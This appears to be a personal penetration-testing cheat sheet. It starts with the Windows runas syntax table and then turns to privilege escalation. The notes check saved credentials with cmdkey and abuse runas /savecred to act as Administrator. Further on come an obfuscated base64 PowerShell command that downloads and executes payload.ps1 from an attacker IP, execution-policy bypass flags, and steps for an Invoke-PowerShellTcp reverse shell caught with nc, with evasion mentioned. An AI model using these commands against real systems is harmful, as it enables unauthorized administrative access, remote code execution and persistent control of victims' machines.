## Syntax

Copy

```
runas [{/profile | /noprofile}] [/env] [{/netonly | /savecred}] [/smartcard] [/showtrustlevels] [/trustlevel] /user:<UserAccountName> "<ProgramName> <PathToProgramFile>"
```

[](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)#parameters)

## Parameters

| Parameter                                                               | Description                                                                                                                                                                                                                                         |
| ----------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **/profile**                                                            | Loads the user's profile. This is the default. This parameter cannot be used with the **/netonly** parameter.                                                                                                                                       |
| **/no profile**                                                         | Specifies that the user's profile is not to be loaded. This allows the application to load more quickly, but it can also cause a malfunction in some applications.                                                                                  |
| **/env**                                                                | Specifies that the current network environment be used instead of the user's local environment.                                                                                                                                                     |
| **/netonly**                                                            | Indicates that the user information specified is for remote access only. This parameter cannot be used with the **/profile** parameter.                                                                                                             |
| **/savecred**                                                           | Indicates if the credentials have been previously saved by this user. This parameter is not available and will be ignored on Windows Vista Home or Windows Vista Starter Editions. This parameter cannot be used with the **/smartcard** parameter. |
| **/smartcard**                                                          | Indicates whether the credentials are to be supplied from a smartcard. This parameter cannot be used with the **/savecred** parameter.                                                                                                              |
| **/showtrustlevels**                                                    | Displays the trust levels that can be used as arguments to **/trustlevel**.                                                                                                                                                                         |
| **/trustlevel**                                                         | Specifies the level of authorization at which the application is to run. Use **/showtrustlevels** to see the trust levels available.                                                                                                                |
| **/user:<**UserAccountName> **"<**ProgramName> <PathToProgramFile>**"** | Specifies the name of the user account under which to run the program, the program name, and the path to the program file. The user account name format should be <User>**@<**Domain> or <Domain>**\<**UserAccountName>.                            |
| **/?**                                                                  | Displays help at the command prompt.                                                                                                                                                                                                                |

- **WE CAN RUN THIS WHEN PASSWORD IS STORED ON THE SYSTEM TO CHECK IF THE PASSWORD IS STORED OR NOT **
- `cmdkey /list`

```powershell
 runas.exe /user:\<USER\> /savecred "executable to run we will run cmd or powershell and inside this quoted we can execute commands as administrator"
```

```powershell
runas /user:ACCESS\Administrator /savecred "powershell -encodedcommand "aQBuAHYAbwBrAGUALQBlAHgAcAByAGUAcwBzAGkAbwBuACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMAOAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkAKQA=""
```

the actual command i used to run runas with encoded command via runas command 
- `cmd.exe /c `
- `powershell -nop -ep bypass command`
- `powershell -encodedcommand "UTF16Le base64 string"`
	- for encoding in this format and in base64 cyberchef online website is enough but for offline this is the command 
	- `echo -n "<CMD>" | iconv --to-code UTF-16LE | base64 -w 0`
		- this will result in encoded command remember to use this whenever you are stuck on escaping character in commands and shells just encode it and run powershell to exectute 


#### UPGRADING SHELL FOR WINDOWS

sometimes we have service accounts and they dont have proper cmd or powershell like capabilities so we need to upgrade our shell to the point where we can work 

- ##### INVOKE-POWERSHELLTCP.PS1 

 use powershell [[Windows File Transfer Methods#PowerShell Base64 Encode & Decode]] 
 [[Windows File Transfer Methods#explanation of the above powershell commands]]
 [[Windows File Transfer Methods#Confirming the MD5 Hashes Match]] 
 [[Windows File Transfer Methods#PowerShell Web Downloads]]
 [[Windows File Transfer Methods#PowerShell DownloadFile Method]] 
 [[Windows File Transfer Methods#PowerShell DownloadString - Fileless Method]] 
 [[Windows File Transfer Methods#Common Errors with PowerShell]] 
    to download the script from your attacking box 

- when having command execution 
- edit invoke-powershelltcp.ps1 file and at the end of the file execute this script with appropriate flags , 
- use invoke expression iex to run it without saving it on disk 
	- there can issues regarding all this AMSI BYPASS AND logging and lot more of evasion technique that is out of scope
- in IEX use net.webclient class to download the script 
- before the execution of the above command , use `rlwrap` with `nc` to listen on that port 

